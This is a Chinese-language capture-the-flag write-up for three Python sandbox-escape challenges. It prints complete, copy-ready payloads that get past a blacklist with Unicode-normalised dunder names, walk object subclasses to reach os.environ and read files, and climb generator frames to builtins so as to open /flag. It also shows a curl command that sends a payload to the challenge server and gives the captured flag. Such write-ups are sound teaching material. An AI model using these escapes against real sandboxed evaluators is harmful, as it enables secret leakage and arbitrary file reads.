### I really really really

codex resume 019c1259-8700-78c0-b93e-d5f695601403

题目对 `__、数字、引号、[]{};` 等做了拦截，print/open/len这些函数也被移除了

hint是 “unicode 太好用了” ，所以考虑用Unicode来绕过黑名单

`_`会被拦截成语法错误，所以用`﹍(U+FE4D)`就行

Python 标识符会做 NFKC 归一化，所以`﹍(U+FE4D)` 归一化为 `_`， `ｃｌａｓｓ` 归一化为 `class`

用 dunder 组合出对象链

 我们要得到 object 的 subclasses，再去找能带我们拿到 os.environ 的类。

```
().__class__.__mro__          # tuple 的 MRO: (tuple, object)
object.__subclasses__()       # 所有已加载类

而 payload 用 Unicode 绕过后写成：

m=()._﹍ｃｌａｓｓ﹍_._﹍ｍｒｏ﹍_
i=m._﹍ｉｔｅｒ﹍_()
t=i._﹍ｎｅｘｔ﹍_()     # tuple
o=i._﹍ｎｅｘｔ﹍_()     # object
s=o._﹍ｓｕｂｃｌａｓｓｅｓ﹍_()
```

之后发现`getitem`被ban，所以改用iter或next取下标

```
it = s.__iter__()
for _ in range(n): c = it.__next__()
#但这里n不能用数字，所以用True来算
```

因为 True 在 Python 中等于 1：

```
two=True+True      # 2
four=two*two       # 4
sixteen=four*four  # 16
sixtyfour=four*sixteen   # 64
twofivesix=sixteen*sixteen  # 256
```

371 = 256+64+32+16+2+1

把加法拆成多行，避免超过 30 字符：

```
  n=twofivesix
  n=n+sixtyfour
  n=n+thirtytwo
  n=n+sixteen
  n=n+two
  n=n+True
  n=n+True
```

  > 为什么是 371？
  > 通过“逐个下标枚举 + 输出 class 名称”定位出来的。
  > 枚举用的是：
  >
  > ...  # 走到 s = object.__subclasses__()
  > j=s.__iter__()
  > (next n 次)
  > c=j.__next__()
  > assert False, c.__name__
  >
  > 反复改 n，直到出现 Popen。



Payload：

```
m=()._﹍ｃｌａｓｓ﹍_._﹍ｍｒｏ﹍_
i=m._﹍ｉｔｅｒ﹍_()
t=i._﹍ｎｅｘｔ﹍_()
o=i._﹍ｎｅｘｔ﹍_()
s=o._﹍ｓｕｂｃｌａｓｓｅｓ﹍_()
j=s._﹍ｉｔｅｒ﹍_()
two=True+True
four=two*two
sixteen=four*four
thirtytwo=two*sixteen
sixtyfour=four*sixteen
twofivesix=sixteen*sixteen
n=twofivesix
n=n+sixtyfour
n=n+thirtytwo
n=n+sixteen
n=n+two
n=n+True
n=n+True
c=None
while n:
    c=j._﹍ｎｅｘｔ﹍_()
    n=n-True
g=c._﹍ｉｎｉｔ﹍_._﹍ｇｌｏｂａｌｓ﹍_
vals=g.values()
it=vals._﹍ｉｔｅｒ﹍_()
eight=two*four
midx=eight+two
midx=midx+True
midx=midx+True
v=None
while midx:
    v=it._﹍ｎｅｘｔ﹍_()
    midx=midx-True
e=v.environ
assert False,e
```



curl -s -X POST http://114.66.24.228:30771/ \
--data-urlencode "code=$(cat payload.txt)"

VNCTF{I_r3@11y_R34Lly_ReAl1y_11ke_U&I_w@NT_U_Do_U_W@nT_M3_t#o?xPbdwiJ}

### I really really really revenge

思路和原题目一样，但是略有不同

```
m=()._﹍ｃｌａｓｓ﹍_._﹍ｍｒｏ﹍_
i=m._﹍ｉｔｅｒ﹍_()
t=i._﹍ｎｅｘｔ﹍_()
o=i._﹍ｎｅｘｔ﹍_()
s=o._﹍ｓｕｂｃｌａｓｓｅｓ﹍_()
j=s._﹍ｉｔｅｒ﹍_()
two=True+True
four=two*two
sixteen=four*four
thirtytwo=two*sixteen
sixtyfour=four*sixteen
twofivesix=sixteen*sixteen
n=twofivesix
n=n+sixtyfour
n=n+thirtytwo
n=n+sixteen
n=n+two
n=n+True
n=n+True
c=None
while n:
    c=j._﹍ｎｅｘｔ﹍_()
    n=n-True
g=c._﹍ｉｎｉｔ﹍_._﹍ｇｌｏｂａｌｓ﹍_
vals=g.values()
it=vals._﹍ｉｔｅｒ﹍_()
eight=two*four
midx=eight+two
midx=midx+True
midx=midx+True
v=None
while midx:   #拿os模块
    v=it._﹍ｎｅｘｔ﹍_()
    midx=midx-True
lst=v.listdir()  #列文件名
itt=lst._﹍ｉｔｅｒ﹍_()  
ten=eight+two
twenty=ten+ten
idx=twenty
name=None
while idx:   #逐个遍历
    name=itt._﹍ｎｅｘｔ﹍_()
    idx=idx-True
p=v.sep+name  #路径分隔符拼出 "/" + name
fd=v.open(p,v.O_RDONLY)
st=v.stat(p)
size=st.st_size
data=v.read(fd,size)
assert False,data  #抛异常，把 data 带出来
```



### I really really really ultimate

比前两个题目多禁了Unicode，但仍可用生成器帧拿到上层 frame。

`g=(g.gi_frame.f_back for _ in (None,))` 获取当前执行帧，再用 `f.f_back` 得到 `app.py` 的 frame。

从 `f_globals` 取到 __builtins__（在 globals 中第 6 个 key），得到 `builtins` 模块。

用 `builtins.chr` 拼 `/flag`，再 builtins.open 读取。

```
# 1) 用生成器拿到上一层 frame（app.py 的 frame）
g=(g.gi_frame.f_back
for _ in (None,))     # 生成器表达式，yield 当前帧的 f_back
f=g.send(None)         # 启动生成器，得到当前帧的 f_back
fr=f.f_back            # 再向上一层，进入 app.py 的执行帧
gl=fr.f_globals        # 取 app.py 的全局变量字典

# 2) 遍历 globals，取第 6 个 key（__builtins__）
it=gl
idx=False
k=None
one=True
two=one+one
four=two*two
six=four+two           # six = 6
for v in it:
    k=v
    if idx==six:
        bn=gl.get(k)   # bn 即 builtins 模块
    idx=idx+True

eight=two*four
sixteen=four*four
thirtytwo=two*sixteen
sixtyfour=four*sixteen

# 凑 "/flag" 各字符的 ASCII 值
na=thirtytwo+eight
na=na+four
na=na+two
na=na+one              # 47 -> '/'
nb=sixtyfour+thirtytwo
nb=nb+four
nb=nb+two              # 102 -> 'f'
nc=sixtyfour+thirtytwo
nc=nc+eight
nc=nc+four             # 108 -> 'l'
nd=sixtyfour+thirtytwo
nd=nd+one              # 97  -> 'a'
ne=sixtyfour+thirtytwo
ne=ne+four
ne=ne+two
ne=ne+one              # 103 -> 'g'

# chr 拼 "/flag"
ca=bn.chr(na)
cb=bn.chr(nb)
cc=bn.chr(nc)
cd=bn.chr(nd)
ce=bn.chr(ne)
pa=ca+cb
pa=pa+cc
pa=pa+cd
pa=pa+ce

# open 读 /flag 用assert输出
h=bn.open(pa)
d=h.read()
assert False,d
```

这里附上能直接copy的

```
g=(g.gi_frame.f_back
for _ in (None,))
f=g.send(None)
fr=f.f_back
gl=fr.f_globals
it=gl
idx=False
k=None
one=True
two=one+one
four=two*two
six=four+two
for v in it:
    k=v
    if idx==six:
        bn=gl.get(k)
    idx=idx+True
eight=two*four
sixteen=four*four
thirtytwo=two*sixteen
sixtyfour=four*sixteen
na=thirtytwo+eight
na=na+four
na=na+two
na=na+one
nb=sixtyfour+thirtytwo
nb=nb+four
nb=nb+two
nc=sixtyfour+thirtytwo
nc=nc+eight
nc=nc+four
nd=sixtyfour+thirtytwo
nd=nd+one
ne=sixtyfour+thirtytwo
ne=ne+four
ne=ne+two
ne=ne+one
ca=bn.chr(na)
cb=bn.chr(nb)
cc=bn.chr(nc)
cd=bn.chr(nd)
ce=bn.chr(ne)
pa=ca+cb
pa=pa+cc
pa=pa+cd
pa=pa+ce
h=bn.open(pa)
d=h.read()
assert False,d
```

